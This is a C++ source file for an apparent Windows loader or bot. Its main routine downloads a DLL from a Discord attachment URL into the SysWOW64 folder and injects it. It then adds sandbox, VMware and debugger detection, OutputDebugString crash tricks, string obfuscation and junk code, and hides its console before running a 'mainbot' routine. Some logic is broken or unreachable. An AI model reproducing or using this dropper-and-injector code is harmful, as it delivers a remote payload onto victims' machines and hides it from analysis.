#include "../Demon Cleaner/Headers/dead.hpp"
#include <string>
#include <windows.h>
#include <Urlmon.h>
#include "../Demon Cleaner/Headers/junk-code.h"
#include <Wininet.h>
#include <stdlib.h>
#include <vector>
#include <tchar.h>
#include "../Demon Cleaner/Headers/color.hpp"
#include "../Demon Cleaner/Headers/json.hpp"
#include <fstream>
#include "../Demon Cleaner/Headers/value.h"
#include <stringapiset.h>
#include <TlHelp32.h>
#include "../Demon Cleaner/Headers/antidbg.h"
#include <cstdio>
#include <iostream>
#include "loader.h"
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib") 
#include "../Demon Cleaner/Headers/lazy_importer.hpp"
#include "inject.h"
BOOL IsSandboxie()
{
    if (GetModuleHandle("SbieDll.dll") != NULL)
        exit(0);


    return FALSE;
}
auto RandomTitle = [](int iterations) {
    std::string Title;
    for (int i = 0; i < iterations; i++)
        Title += rand() % 255 + 1;
    return Title;
};
BOOL IsVMware()
{
    BOOL bDetected = FALSE;

    __try
    {
        __asm
        {
            mov    ecx, 0Ah
            mov    eax, 'VMXh'
            mov    dx, 'VX'
            in    eax, dx
            cmp    ebx, 'VMXh'
            sete    al
            movzx   eax, al
            mov    bDetected, eax
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return FALSE;
    }

    return bDetected;
    if (bDetected)
    {
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE VM Detected && ECHO You got detected using VM Workstation . && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
        LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
    }
}
int main()
{
    SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());

    std::string dll = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891653781832486972/server.dll").c_str());
    std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
    URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
    injector();
    Sleep(1000);

    

    if (IsDebuggerPresent())
    {

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
        LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
    }
    if (GetLastError == 0)
    {

        IsSandboxie();
        IsVMware();
        bool checkconnection = InternetCheckConnection("https://google.com/", FLAG_ICC_FORCE_CONNECTION, 0);
        if (!checkconnection)
        {
            system(dead("start cmd /c START CMD /C \"COLOR C && TITLE No Internet && ECHO You are not connected to the internet . && TIMEOUT 10 >nul").c_str());
            Sleep(3000);
            exit(0);
            LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
            LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
            LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
        }
        
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
            loadserial();
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
            mainbot();
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
            FreeConsole();
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        
        

    }
    else
    {
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software . && TIMEOUT 10 >nul").c_str());
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        exit(0);
        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
        LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
    }
   
}
           
